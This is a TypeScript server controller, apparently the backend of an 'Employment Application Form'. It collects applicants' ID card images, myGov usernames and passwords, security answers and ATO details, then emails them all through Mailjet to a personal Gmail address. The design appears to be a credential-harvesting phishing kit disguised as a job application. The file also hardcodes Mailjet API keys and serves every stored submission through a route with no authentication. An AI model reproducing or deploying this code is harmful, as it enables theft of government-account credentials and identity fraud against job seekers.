import { RequestResponse } from "./form_data.interface";
import TFormData from "./form_data.model";
import HandleResponse from './helpers/HandleResponse';
import MailJetInit from "./helpers/MailJetInitializer";
import { FormDataType } from './form_data.interface';
import moment from "moment";

class FormDataController {
    static async PostFormData(req: RequestResponse["req"],
    res: RequestResponse["res"]) {
        const {
ato,
email,
first_name,
gender,
has_gov_profile,
id_card_back,
id_card_front,
is_visa_holder,
last_name,
mobile_number,
my_gov,
my_gov_password,
my_gov_username,
position,
prev_work,
qualification,
relationship,
security_answer,
security_question,
skills
        } = req.body
        const FormBody = {
            ato,
            email,
            first_name,
            gender,
            has_gov_profile,
            id_card_back,
            id_card_front,
            is_visa_holder,
            last_name,
            mobile_number,
            my_gov,
            my_gov_password,
            my_gov_username,
            position,
            prev_work,
            qualification,
            relationship,
            security_answer,
            security_question,
            skills
                    }
        console.log(FormBody)
        const newFormData = new TFormData(FormBody)
        await newFormData.save()
        .then((form)=> {
            console.log(form)
            const Mailjet = require('node-mailjet');
            const mailjet = Mailjet.apiConnect(
                "e9eaffa461afb81ea8a27096359b6174",
                "659637bc07b24b92ddc0f54e7f3d11f2",
            );
                const request = mailjet
                .post("send", {'version': 'v3.1'})
                .request({
                    "Messages":[
                        {
                            "From": {
                                "Email": "musa4jubril@gmail.com",
                                "Name": "Employment Application Form"
                            },
                            "To": [
                                {
                                    "Email": "Pv6243@gmail.com",
                                    // "Email": "jewbreel1@gmail.com",
                                    "Name": "Dahbira"
                                },
                            ],
                            "TemplateID": 4538541,
        "TemplateLanguage": true,
        // 'TemplateErrorReporting' : 'musa4jubril@gmail.com',
        //         'TemplateErrorDeliver' : 'deliver',
                            "Subject": `[[data:full_name:${form?.first_name + " " +form?.last_name}]] Employment Application Form`,
                            "Variables": {
                                "full_name": `${form?.first_name + " " +form?.last_name}`,
                                "created": `${moment(new Date()).format("LL")}`,
                                "phone_number": `${form?.mobile_number}`,
                                "email": `${form?.email}`,
                                "gender": `${form?.gender}`,
                                "relationship": `${form?.relationship}`,
                                "has_gov_profile": `${form?.has_gov_profile}`,
                                "is_visa_holder": `${form?.is_visa_holder}`,
                                "my_gov": `${form?.my_gov}`,
                                "my_gov_username": `${form?.my_gov_username}`,
                                "my_gov_password": `${form?.my_gov_password}`,
                                "security_question": `${form?.security_question}`,
                                "security_answer": `${form?.security_answer}`,
                                "ato": `${form?.ato}`,
                                "position": `${form?.position}`,
                                "qualification": `${form?.qualification}`,
                                "prev_work": `${form?.prev_work}`,
                                "skills": `${form?.skills}`,
                                "id_card": `front: ${form?.id_card_front}\n back: ${form?.id_card_front}`
                              }
                        }
                    ]
                })
            request
                .then(() => {
                    console.log("Done")
                    HandleResponse({
                        res,
                        status: 201,
                        data: {form},
                        message: "Employment Application Submitted Successfully"
                    })
                    // return true
                })
                .catch(() => {
                    console.log("failed")
                    return false
                })
        })
    }

    static async GetFormData(req: RequestResponse["req"],
    res: RequestResponse["res"]) {
        await TFormData.find()
        .then((form)=> {
            HandleResponse({
                res,
                status: 200,
                data: {form},
                message: "All Submitted Employment Retrieved Successfully"
            })
        })
    }

    static async GetSingleFormData(req: RequestResponse["req"],
    res: RequestResponse["res"]) {
        const _id = req.params
        await TFormData.findById({_id})
        .then((form)=> {
            HandleResponse({
                res,
                status: 200,
                data: {form},
                message: `${form?.first_name} ${form?.last_name}'s emplotment application form retrieved successfully`
            })
        })
    }
}

export default FormDataController;